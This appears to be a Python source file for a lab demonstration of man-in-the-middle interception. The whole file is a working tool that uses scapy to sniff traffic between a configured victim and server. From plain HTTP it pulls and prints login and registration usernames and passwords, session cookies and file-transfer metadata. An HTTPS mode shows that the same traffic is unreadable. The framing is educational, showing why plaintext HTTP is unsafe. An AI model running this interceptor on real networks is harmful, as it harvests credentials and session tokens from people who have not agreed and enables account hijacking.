import argparse
import os
import re
import sys
import threading
import time
from types import SimpleNamespace
from urllib.parse import parse_qs

from scapy.all import IP, TCP, Raw, sniff

import config.constants as C


IFACE = C.IFACE
SERVER_IP = C.SERVER_IP
VICTIM_IP = C.VICTIM_IP
BACKEND_PORT = getattr(C, "BACKEND_HTTP_PORT", 5000)

EVENT_CACHE = {}
TLS_LAST_NOTICE = 0


def require_root():
    if os.geteuid() != 0:
        sys.exit("Error: run with sudo. Packet sniffing requires raw socket access.")


def split_headers_body(text: str):
    if "\r\n\r\n" in text:
        return text.split("\r\n\r\n", 1)
    if "\n\n" in text:
        return text.split("\n\n", 1)
    return text, ""


def parse_headers(header_text: str) -> dict:
    headers = {}
    lines = header_text.splitlines()

    for line in lines[1:]:
        if ":" not in line:
            continue
        name, value = line.split(":", 1)
        headers[name.strip().lower()] = value.strip()

    return headers


def parse_request_line(first_line: str):
    parts = first_line.split()
    if len(parts) >= 2:
        return parts[0], parts[1]
    return None, None


def is_request(first_line: str) -> bool:
    return first_line.startswith(
        ("GET ", "POST ", "PUT ", "DELETE ", "PATCH ", "HEAD ", "OPTIONS ")
    )


def is_response(first_line: str) -> bool:
    return first_line.startswith("HTTP/")


def suppress_duplicate(key: str, ttl: int = 5) -> bool:
    now = time.time()
    last_seen = EVENT_CACHE.get(key)

    if last_seen and now - last_seen < ttl:
        return True

    EVENT_CACHE[key] = now
    return False


def print_event(title: str, lines: list[str], key: str):
    if suppress_duplicate(key):
        return

    print()
    print("=" * 70)
    print(title)
    for line in lines:
        print(line)
    print("=" * 70)
    print()


def extract_filename(body: str) -> str | None:
    match = re.search(r'filename="([^"]+)"', body)
    if match:
        return match.group(1)
    return None


def handle_demo_http(packet, text: str):
    headers_text, body = split_headers_body(text)
    lines = headers_text.splitlines()

    if not lines:
        return

    first_line = lines[0]
    headers = parse_headers(headers_text)

    # Ignore boring static assets
    if "/static/" in first_line:
        return

    # -------------------------
    # Client request handling
    # -------------------------
    if is_request(first_line):
        method, path = parse_request_line(first_line)
        cookie = headers.get("cookie", "")

        # 1. Login/register credential capture
        if method == "POST" and path in {"/login", "/register"}:
            form = parse_qs(body)
            username = form.get("username", [""])[0]
            password = form.get("password", [""])[0]

            if username or password:
                print_event(
                    "[PLAINTEXT CREDENTIALS FOUND]",
                    [
                        f"Endpoint: {path}",
                        f"Username: {username}",
                        f"Password: {password}",
                        "Impact: HTTP exposes credentials during MITM interception.",
                    ],
                    key=f"creds:{path}:{username}:{password}",
                )

        # 2. Session cookie exposed in request
        if "session_id=" in cookie:
            session_part = cookie.split("session_id=", 1)[1].split(";", 1)[0]

            print_event(
                "[SESSION COOKIE EXPOSED]",
                [
                    f"Endpoint: {path}",
                    f"session_id: {session_part}",
                    "Impact: HTTP exposes session tokens that may allow session hijacking.",
                ],
                key=f"cookie:{session_part}:{path}",
            )

        # 3. File upload metadata
        if method == "POST" and path == "/upload":
            filename = extract_filename(body)
            content_length = headers.get("content-length", "unknown")
            content_type = headers.get("content-type", "unknown")
            cookie_seen = "yes" if "session_id=" in cookie else "no"

            output = [
                "Endpoint: /upload",
                f"Content-Length: {content_length}",
                f"Content-Type: {content_type}",
                f"Session cookie exposed: {cookie_seen}",
                "Impact: HTTP exposes file upload metadata and may expose file bytes.",
            ]

            if filename:
                output.insert(1, f"Filename: {filename}")

            print_event(
                "[FILE UPLOAD OVER HTTP]",
                output,
                key=f"upload:{content_length}:{filename}",
            )

        # 4. File download request
        if method == "GET" and path and path.startswith("/files/"):
            print_event(
                "[FILE DOWNLOAD OVER HTTP]",
                [
                    f"Endpoint: {path}",
                    "Impact: downloaded file contents may be visible over HTTP.",
                ],
                key=f"download:{path}",
            )

    # -------------------------
    # Server response handling
    # -------------------------
    elif is_response(first_line):
        set_cookie = headers.get("set-cookie", "")

        if "session_id=" in set_cookie:
            session_part = set_cookie.split("session_id=", 1)[1].split(";", 1)[0]

            print_event(
                "[SERVER SET SESSION COOKIE OVER HTTP]",
                [
                    f"session_id: {session_part}",
                    "Impact: server issued session token over unencrypted HTTP.",
                ],
                key=f"setcookie:{session_part}",
            )


def handle_debug_http(packet, text: str):
    headers_text, body = split_headers_body(text)
    first_line = headers_text.splitlines()[0] if headers_text.splitlines() else "UNKNOWN"

    ip = packet[IP]
    tcp = packet[TCP]

    print()
    print("=" * 70)
    print("[DEBUG HTTP PACKET]")
    print(f"Source: {ip.src}:{tcp.sport}")
    print(f"Dest:   {ip.dst}:{tcp.dport}")
    print(f"Line:   {first_line}")

    headers = parse_headers(headers_text)
    for name in ["host", "cookie", "set-cookie", "content-type", "content-length"]:
        if name in headers:
            print(f"{name}: {headers[name]}")

    if body.strip():
        print("Body snippet:")
        print(body[:500])

    print("=" * 70)
    print()


def is_tls_handshake(payload: bytes) -> bool:
    return (
        len(payload) >= 3
        and payload[0] == 0x16
        and payload[1] == 0x03
    )


def handle_tls_notice(packet):
    global TLS_LAST_NOTICE

    now = time.time()
    if now - TLS_LAST_NOTICE < 5:
        return

    TLS_LAST_NOTICE = now

    ip = packet[IP]
    tcp = packet[TCP]

    print()
    print("=" * 70)
    print("[ENCRYPTED HTTPS TRAFFIC OBSERVED]")
    print(f"Source: {ip.src}:{tcp.sport}")
    print(f"Dest:   {ip.dst}:{tcp.dport}")
    print("Meaning: packets are visible, but credentials/cookies/files are not readable.")
    print("=" * 70)
    print()


def inspect_packet(packet, args):
    if not packet.haslayer(IP) or not packet.haslayer(TCP) or not packet.haslayer(Raw):
        return

    payload = bytes(packet[Raw].load)

    if args.transport == "https":
        if is_tls_handshake(payload):
            handle_tls_notice(packet)
        return

    text = payload.decode("utf-8", errors="replace")

    if not (
        text.startswith(("GET ", "POST ", "HTTP/"))
        or "\r\nHost:" in text
        or "\nHost:" in text
    ):
        return

    if args.output == "debug":
        handle_debug_http(packet, text)
    else:
        handle_demo_http(packet, text)


def parse_args():
    parser = argparse.ArgumentParser(description="MITM backend traffic interceptor")

    parser.add_argument(
        "--output",
        choices=["demo", "debug"],
        default="demo",
        help="demo = security findings only, debug = packet details",
    )

    parser.add_argument(
        "--transport",
        choices=["http", "https"],
        default="http",
        help="Use http for plaintext backend mode, https for HTTPS comparison mode",
    )

    parser.add_argument("--iface", default=IFACE)
    parser.add_argument("--victim-ip", default=VICTIM_IP)
    parser.add_argument("--server-ip", default=SERVER_IP)
    parser.add_argument("--backend-port", type=int, default=BACKEND_PORT)

    return parser.parse_args()


def main():
    require_root()
    args = parse_args()

    bpf_filter = f"tcp and host {args.server_ip} and port {args.backend_port}"

    print("[+] Interceptor started")
    print(f"[*] Output mode: {args.output}")
    print(f"[*] Transport:   {args.transport}")
    print(f"[*] Interface:   {args.iface}")
    print(f"[*] Victim IP:   {args.victim_ip}")
    print(f"[*] Server IP:   {args.server_ip}")
    print(f"[*] Port:        {args.backend_port}")
    print("[*] Waiting for security-relevant traffic...")
    print()

    sniff(
        iface=args.iface,
        filter=bpf_filter,
        prn=lambda packet: inspect_packet(packet, args),
        store=False,
    )


def run_interceptor(
    *,
    iface: str,
    victim_ip: str,
    server_ip: str,
    backend_port: int,
    transport: str,
    stop_event: threading.Event,
    output: str = "demo",
) -> None:
    require_root()

    args = SimpleNamespace(output=output, transport=transport)
    bpf_filter = f"tcp and host {server_ip} and port {backend_port}"

    print("[+] Interceptor started")
    print(f"[*] Output mode: {output}")
    print(f"[*] Transport:   {transport}")
    print(f"[*] Interface:   {iface}")
    print(f"[*] Victim IP:   {victim_ip}")
    print(f"[*] Server IP:   {server_ip}")
    print(f"[*] Port:        {backend_port}")
    print("[*] Waiting for security-relevant traffic...")
    print()

    while not stop_event.is_set():
        sniff(
            iface=iface,
            filter=bpf_filter,
            prn=lambda packet: inspect_packet(packet, args),
            store=False,
            timeout=1,
        )

    print("[+] Interceptor stopped")


if __name__ == "__main__":
    main()
